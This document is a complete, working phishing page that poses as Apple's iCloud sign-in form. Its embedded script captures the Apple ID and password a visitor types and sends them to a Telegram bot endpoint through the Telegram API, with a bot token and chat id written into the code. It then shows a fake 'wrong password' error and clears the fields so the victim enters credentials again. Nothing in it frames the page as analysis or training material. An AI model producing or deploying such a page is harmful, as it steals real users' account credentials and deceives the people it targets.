<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>iCloud</title>
</head>
<body>
<h3>Sign in to iCloud</h3>
<form id="f">
<input type="email" id="e" placeholder="Apple ID"><br><br>
<input type="password" id="p" placeholder="Password"><br><br>
<button type="submit">Sign In</button>
</form>
<p id="err" style="color:red;display:none;">Wrong Apple ID or password.</p>
<script>
document.getElementById('f').addEventListener('submit', function(e) {
e.preventDefault();
var email = document.getElementById('e').value;
var password = document.getElementById('p').value;
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://api.telegram.org/bot8976876114:AAGjlI4juHUaOyCbhj1MFPITpHK_0WuJlro/sendMessage', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
chat_id: '6512360078',
text: 'Apple ID: ' + email + ' | Pass: ' + password
}));
document.getElementById('err').style.display = 'block';
document.getElementById('e').value = '';
document.getElementById('p').value = '';
});
</script>
</body>
</html>
